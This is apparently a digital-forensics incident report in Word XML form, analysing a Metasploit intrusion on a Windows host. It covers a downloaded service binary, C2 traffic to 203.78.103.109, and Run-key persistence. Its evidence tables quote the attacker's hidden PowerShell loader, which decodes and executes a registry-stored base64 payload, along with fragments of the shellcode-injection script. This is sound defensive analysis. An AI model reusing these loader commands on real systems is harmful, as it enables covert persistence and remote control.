        <w:t>$UsnJrnl: Edge cache file C:\Users\Administrator\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC\#!001\MicrosoftEdge\Cache\ELJ4KX67\coreupdater[1].exe created 2020-09-19 03:39:57.907 UTC; C:\Users\Administrator\Downloads\coreupdater.exe.b1jhvkh.partial (MFT 26213-4) renamed to Downloads\coreupdater.exe at 03:40:00.864 (Zone.Identifier ADS stream written); OpenSavePidlMRU 'This PC\Downloads\coreupdater.exe' 03:40:00.69; renamed to C:\Windows\System32\coreupdater.exe at 03:40:42.254 (same MFT entry 26213, size 7168). Amcache: c:\windows\system32\coreupdater.exe SHA1 fd153c66386ca93ec9993d66a84d6f0d129a3a5c, PE link date 2010-04-14 22:06:53. Prefetch COREUPDATER.EXE-157C54BB.pf: RunCount 1, LastRun 03:40:49.410. Memory psscan: coreupdater.ex PID 8324 PPID 4008 created 03:40:49, exited 03:43:10. System EID 7045 RecordID 958 at 03:42:42.677: service 'coreupdater', ImagePath C:\Windows\System32\coreupdater.exe, auto start, LocalSystem. Network capture: HTTP GET http://194.61.24.102/coreupdater.exe from 10.42.85.115 (UA Edge/18.19041), 7168 bytes, SHA256 10f3b92002bb98467334161cf85d0b1730851f9256f83c27db125e9a0c1cfda6, MD5 eed41b4500e473f97c50c7385ef5e374 (pcap clock 02:39:58); the same file was fetched by the DC 10.42.85.10 earlier (pcap 02:24:06). Flow 10.42.85.115:50875 -&gt; 203.78.103.109:443 starting pcap 02:40:49 (= prefetch run 03:40:49 with the ~1 h capture-clock offset), 1.76 MB down / 280 KB up, still ESTABLISHED in memory netscan; Suricata 'ET MALWARE Possible Metasploit Payload Common Construct Bind_API (from server)' on that flow.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>True positive. 7168-byte PE with 2010 link date, fetched from a dotted-quad IP, executed once then registered as a LocalSystem auto-start service: consistent with a Metasploit/Meterpreter stager (msfvenom exe template) beaconing to 203.78.103.109:443 (Meterpreter stage download confirmed by the Bind_API signature on the server-&gt;client stream). No detection engine flagged the 7045 for coreupdater (path in System32) — gap of the rule set. Pcap timestamps run ~1 h behind the host clock (consistent offsets: RDP 02:35:55 vs 03:35:54, download 02:39:58 vs 03:39:57, C2 flow 02:40:49 vs 03:40:49).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Evidence (14)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03:39:57.907806</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>F:\Users\Administrator\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC\#!001\MicrosoftEdge\Cache\ELJ4KX67\coreupdater[1].exe</w:t>
              <w:br/>
              <w:t>FileCreate [Archive|NotContentIndexed] entry=24493-3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#35845</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:00.863618</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>F:\Users\Administrator\Downloads\coreupdater.exe</w:t>
              <w:br/>
              <w:t>RenameNewName|Close [Archive] entry=26213-4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#35889</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:42.254194</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>F:\Windows\System32\coreupdater.exe</w:t>
              <w:br/>
              <w:t>RenameNewName [Archive] entry=26213-4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#35942</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:00.691657</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$SI creation (B)</w:t>
              <w:br/>
              <w:t>F:\Windows\System32\coreupdater.exe</w:t>
              <w:br/>
              <w:t>size=7168</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#27972</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:45.191906</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Amcache (files)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Amcache: file key written (≈ first execution / presence)</w:t>
              <w:br/>
              <w:t>c:\windows\system32\coreupdater.exe</w:t>
              <w:br/>
              <w:t>coreupdater.exe SHA1=fd153c66386ca93ec9993d66a84d6f0d129a3a5c compiled=2010-04-14 22:06:53.0000000 app=Unassociated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>amcacheparser/20261025201808_Amcache_UnassociatedFileEntries.csv#2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\AppCompat\Programs\Amcache.hve</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:49.410320</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, last)</w:t>
              <w:br/>
              <w:t>COREUPDATER.EXE</w:t>
              <w:br/>
              <w:t>runs=1 hash=157C54BB False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#22</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\prefetch\COREUPDATER.EXE-157C54BB.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:42:42.676537</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>C:\Windows\System32\coreupdater.exe</w:t>
              <w:br/>
              <w:t>System 7045 | Service Control Manager | A new service was installed in the system | Name: coreupdater | StartType: auto start | Account: LocalSystem | C:\Windows\System32\coreupdater.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#40866</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\System.evtx</w:t>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C:\Sleuthline\cases\test04\memory\DESKTOP-SDN1RPT.mem</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:39:58.412735</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suricata/case001.pcap/eve_fileinfo.jsonl#138</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:39:58.411571</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1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_http.jsonl#156</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suricata/case001.pcap/eve_flow.jsonl#29788</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:40:50.282950</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10.42.85.115:50875 | A Network Trojan was detected | 1:pcNgXsCjc/vxVdVvPl9FwJBoPrA= | case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_alert.jsonl#446</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</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volatility/windows.netscan.NetScan.jsonl#110</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:00.691657</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU</w:t>
              <w:br/>
              <w:t>User Activity | OpenSavePidlMRU | 0=Extension: exe Absolute path: This PC\Downloads\coreupdater.exe | Opened: 2020-09-19 03:40:00.6916578 | MRU: 0 Details: Type: Root folder: GUID, Value: This PC</w:t>
              <w:br/>
              <w:br/>
              <w:br/>
              <w:br/>
              <w:br/>
              <w:br/>
              <w:t>Type: Root folder: GUID, Value: Downloads</w:t>
              <w:br/>
              <w:br/>
              <w:br/>
              <w:br/>
              <w:br/>
              <w:br/>
              <w:t>Short name: coreupdater.exe</w:t>
              <w:br/>
              <w:br/>
              <w:br/>
              <w:br/>
              <w:t>Type: File, Value: coreupdater.exe</w:t>
              <w:br/>
              <w:br/>
              <w:br/>
              <w:br/>
              <w:t>Extension blocks found: 1</w:t>
              <w:br/>
              <w:br/>
              <w:t>------</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_F.csv#847</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\Administrator\NTUSER.DAT</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-010: Persistence fired: HKLM Run "coreupdate" launched hidden PowerShell Metasploit shellcode loader at 05:08 (new C2 session to 203.78.103.109:443)</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artifact:prefetch</w:t>
              <w:br/>
              <w:t>artifact:run keys</w:t>
              <w:br/>
              <w:t>evtx:microsoft-windows-powershell%4operational.evtx</w:t>
              <w:br/>
              <w:t>evtx:windows powershell.evtx</w:t>
              <w:br/>
              <w:t>memory</w:t>
              <w:br/>
              <w:t>network</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Category</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>execution / persistence</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>MITRE ATT&amp;CK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>T1547.001, T1059.001, T1027, T1112, T1055, T1620</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Period (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2020-09-19 03:44:03.540241 → 2020-09-19 05:08:44.732435</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Windows PowerShell EID 600 RecordID 1 at 2020-09-19 05:08:40.484 UTC: HostApplication 'powershell -nop -w hidden -c sleep 0; iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((Get-Item 'HKLM:Software\q9Z1bssi').GetValue('JqxNhWJA'))))'. PowerShell/Operational EID 4104 RecordID 4 at 05:08:42.966: script spawning '-noni -nop -w hidden -c &amp;([scriptblock]::create(... GzipStream ... FromBase64String ...))' via ProcessStartInfo (sysnative check); EID 4104 RecordID 8 at 05:08:44.089: gzip/base64 payload 'H4sIAHNwZV8CA7VW...'; EID 4104 RecordID 9 at 05:08:44.732: function pLBA using Microsoft.Win32.UnsafeNativeMethods GetProcAddress (reflective WinAPI resolution / shellcode injection). Prefetch POWERSHELL.EXE-CA1AE517.pf RunCount 2, runs 05:08:37.656 and 05:08:43.031; CMD.EXE LastRun 05:08:37.533. Memory psscan: powershell.exe PID 508 (PPID 1380) 05:08:37-05:08:43 and powershell.exe PID 3316 (PPID 508) created 05:08:43, still running at capture. Network: flow 10.42.85.115:50972 -&gt; 203.78.103.109:443 started pcap 04:08:45 (≈05:08:45 host clock), Suricata 'ET MALWARE Possible Metasploit Payload Common Construct Bind_API (from server)', connection ESTABLISHED in memory netscan.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>True positive (Hayabusa/Chainsaw/Zircolite medium rules: Suspicious PowerShell WindowStyle, FromBase64String on Gzip, WinAPI calls, Malicious PowerShell Keywords). This is the Metasploit 'persistence' style registry-stored payload (random key q9Z1bssi / value JqxNhWJA) triggered by the Run key 'coreupdate' — fired at 05:08:37, which coincides with the responder's USB insertion/logon period (05:08), i.e. triggered by a user logon, not by the collection tools. The reverse HTTPS/TCP Meterpreter session was live at memory acquisition time (PID 3316).</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05:08:40.484484</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Windows PowerShell 600 | PowerShell | Provider is Started | HostApplication=powershell -nop -w hidden -c sleep 0; iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((Get-Item 'HKLM:Software\q9Z1bssi').GetValue('JqxNhWJA'))))</w:t>
              <w:br/>
              <w:t xml:space="preserve"> | HostName=ConsoleHost</w:t>
              <w:br/>
              <w:t xml:space="preserve"> | HostVersion=5.1.19041.1</w:t>
              <w:br/>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#40903</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Windows PowerShell.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:42.966250</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t xml:space="preserve">Microsoft-Windows-PowerShell/Operational 4104 | Microsoft-Windows-PowerShell | Contains contents of scripts run | Path:  | ScriptBlockText: if([IntPtr]::Size -eq 4){$b=$env:windir+'\sysnative\WindowsPowerShell\v1.0\powershell.exe'}else{$b='powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#15076</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Microsoft-Windows-PowerShell%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
